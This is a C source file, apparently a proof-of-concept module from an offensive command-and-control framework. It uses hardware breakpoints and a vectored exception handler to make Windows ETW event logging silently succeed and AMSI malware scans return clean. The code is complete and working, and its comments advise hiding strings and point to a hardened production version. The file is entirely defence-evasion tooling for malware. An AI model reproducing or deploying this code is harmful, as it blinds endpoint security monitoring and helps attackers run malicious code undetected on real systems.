#include "hwbp_evasion.h"
#include <windows.h>
#include <stdint.h>

/*
 * PoC note: uses GetModuleHandleA/LoadLibraryA/GetProcAddress with plaintext
 * strings. In production, replace with a PEB walk and encrypted string storage.
 * See agent/src/evasion/evasion.c in KHAOS C2 for the hardened version.
 */

static LPVOID g_etw_fn       = NULL;  /* EtwEventWrite     -> Dr0 */
static LPVOID g_amsi_fn      = NULL;  /* AmsiScanBuffer    -> Dr1 */
static LPVOID g_amsi_scan_fn = NULL;  /* AmsiScanString    -> Dr2 */
static PVOID  g_veh          = NULL;

/*
 * VEH handler — must live in a section other than .text so it keeps executing
 * if .text is PAGE_NOACCESS during sleep obfuscation (see sleep-obf technique).
 *
 * On EXCEPTION_SINGLE_STEP at a watched address:
 *   EtwEventWrite   -> Rax = STATUS_SUCCESS (0)         -> ETW call silently succeeds
 *   AmsiScanBuffer  -> Rax = E_INVALIDARG (0x80070057)  -> scan returns "clean"
 *   AmsiScanString  -> Rax = E_INVALIDARG (0x80070057)  -> scan returns "clean"
 *
 * Rip is advanced past the call by reading the return address off the stack,
 * and the corresponding Bx status bit in Dr6 is cleared.
 */
__attribute__((section(".run"), noinline))
static LONG WINAPI _hwbp_veh(EXCEPTION_POINTERS *ep)
{
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    CONTEXT *ctx = ep->ContextRecord;
    BOOL handled = FALSE;

    if (g_etw_fn && (LPVOID)(uintptr_t)ctx->Rip == g_etw_fn) {
        ctx->Rax  = 0;
        ctx->Rip  = *(DWORD64 *)(uintptr_t)ctx->Rsp;
        ctx->Rsp += 8;
        ctx->Dr6 &= ~(DWORD64)0x1;
        handled   = TRUE;
    }

    if (g_amsi_fn && (LPVOID)(uintptr_t)ctx->Rip == g_amsi_fn) {
        ctx->Rax  = 0x80070057;
        ctx->Rip  = *(DWORD64 *)(uintptr_t)ctx->Rsp;
        ctx->Rsp += 8;
        ctx->Dr6 &= ~(DWORD64)0x2;
        handled   = TRUE;
    }

    if (g_amsi_scan_fn && (LPVOID)(uintptr_t)ctx->Rip == g_amsi_scan_fn) {
        ctx->Rax  = 0x80070057;
        ctx->Rip  = *(DWORD64 *)(uintptr_t)ctx->Rsp;
        ctx->Rsp += 8;
        ctx->Dr6 &= ~(DWORD64)0x4;
        handled   = TRUE;
    }

    return handled ? EXCEPTION_CONTINUE_EXECUTION : EXCEPTION_CONTINUE_SEARCH;
}

static void _ensure_veh(void)
{
    if (!g_veh)
        g_veh = AddVectoredExceptionHandler(1, _hwbp_veh);
}

/* Write Dr0/Dr1/Dr2/Dr7 on a thread via GetThreadContext/SetThreadContext */
void hwbp_apply_thread(HANDLE hThread)
{
    if (!g_etw_fn && !g_amsi_fn && !g_amsi_scan_fn) return;

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(hThread, &ctx)) return;

    if (g_etw_fn)       ctx.Dr0 = (DWORD64)(uintptr_t)g_etw_fn;
    if (g_amsi_fn)      ctx.Dr1 = (DWORD64)(uintptr_t)g_amsi_fn;
    if (g_amsi_scan_fn) ctx.Dr2 = (DWORD64)(uintptr_t)g_amsi_scan_fn;

    /*
     * Dr7 encoding:
     *   Bits 0,2,4 = local enable for Dr0, Dr1, Dr2
     *   Clear bits [15:0] first to reset any existing conditions,
     *   then set only the breakpoints we have targets for.
     */
    ctx.Dr7 &= ~(DWORD64)0x0FFF0015;
    ctx.Dr7 |= g_etw_fn       ? 0x01 : 0;
    ctx.Dr7 |= g_amsi_fn      ? 0x04 : 0;
    ctx.Dr7 |= g_amsi_scan_fn ? 0x10 : 0;

    SetThreadContext(hThread, &ctx);
}

void hwbp_patch_etw(void)
{
    if (!g_etw_fn) {
        HMODULE h = GetModuleHandleA("ntdll.dll");
        if (h) g_etw_fn = (LPVOID)GetProcAddress(h, "EtwEventWrite");
    }
    _ensure_veh();
    hwbp_apply_thread(GetCurrentThread());
}

void hwbp_patch_amsi(void)
{
    if (!g_amsi_fn || !g_amsi_scan_fn) {
        /* amsi.dll may not be loaded yet — force load it */
        HMODULE h = GetModuleHandleA("amsi.dll");
        if (!h) h = LoadLibraryA("amsi.dll");
        if (h) {
            if (!g_amsi_fn)
                g_amsi_fn      = (LPVOID)GetProcAddress(h, "AmsiScanBuffer");
            if (!g_amsi_scan_fn)
                g_amsi_scan_fn = (LPVOID)GetProcAddress(h, "AmsiScanString");
        }
    }
    _ensure_veh();
    hwbp_apply_thread(GetCurrentThread());
}

void hwbp_patch_all(void)
{
    hwbp_patch_etw();
    hwbp_patch_amsi();
}
